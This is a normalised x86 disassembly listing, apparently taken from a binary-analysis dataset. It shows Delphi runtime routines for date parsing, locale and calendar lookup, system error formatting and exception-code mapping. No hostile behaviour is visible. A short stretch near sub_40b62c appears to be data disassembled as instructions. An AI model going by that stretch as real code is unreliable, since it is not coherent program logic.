mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40427c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a51c
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a5b8
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a354
mov eax esi
call sub_40427c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409758
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40427c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044dc
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407d2c
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40427c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044dc
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407d2c
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40a958
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a40c
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a40c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a40c
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a378
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a354
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a40c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a498
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a378
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a40c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a498
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a354
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4093f4
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a40c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a378
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a40c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a498
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a40c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a378
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ab4c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a958
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40427c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ab80
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a614
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ab4c
mov ebx eax
jmp r-xdata
mov eax esi
call sub_40427c
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40a958
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40ac0c
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_4040ac
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40ac58
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_404010
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_4040ac
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40aca4
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40accc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40ac58
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405aec
sub_40ad08
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40ae1b
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40accc
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404010
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40accc
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404010
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40accc
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404010
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40accc
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404010
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ae22
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fe0
retn
sub_40ae2c
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4041b4
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40ae68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40aecd
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041b4
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408014
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aed4
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
inc ebx
sub_40aee0
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40af77
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40ac58
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408014
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40af7e
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40ae2c
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40ae68
call EnumCalendarInfoA
sub_40af90
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b15a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403fbc
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40ac58
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408014
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40427c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b161
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403fe0
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40860c
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c000
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4044dc
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404284
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_404010
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_40860c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404284
inc ebx
jmp r-xdata
mov eax esi
call sub_40427c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40860c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404284
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404284
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404284
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041a4
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404284
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041a4
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404284
sub_40b1c4
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b1b8
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c1dc
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408530
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405058
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031bc
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408b54
mov eax [ ebp - 0x4 ]
call sub_4084cc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_40447c
mov ebx eax
mov eax ebx
call sub_4084cc
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b34c
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b1c4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405058
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402ad8
call sub_402824
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4084cc
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b414
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404010
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b450
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b4aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408b94
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b4b1
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
add esp 0xfffffff0
call sub_403590
sub_40b4b1
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b4d0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405aec
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b50c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b578
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405aec
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408b94
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b57f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
add esp 0xfffffff0
call sub_403590
sub_40b57f
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b5cc
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402898
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b62c
xor [ esi + 0xa0e0040 ] dh
push esp
inc ebp
js r-xdata
cmp edi 0xffffffff
pop ebx
retn
jo r-xdata
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b73c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404054
jmp r-xdata
push ebx
mov eax edx
jmp sub_4039f8
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b743
lea eax [ ebp - 0x20 ]
call sub_403fbc
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b414
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b5cc
mov edx eax
sub_40b6a0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b73c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404054
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b743
lea eax [ ebp - 0x20 ]
call sub_403fbc
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40b790
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b828
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b9e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_40422c
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_40839c
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9ea
lea eax [ ebp - 0x170 ]
call sub_403fbc
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40b9f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40baaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b790
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b414
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
push ebp
call sub_40b828
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bab6
lea eax [ ebp - 0x10 ]
call sub_403fbc
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
mov ebx eax
sub_40bad0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bac0
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b810
mov eax [ rw-data ]
mov [ eax ] sub_40b9f4
mov eax sub_40b75c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b778
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bb54
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
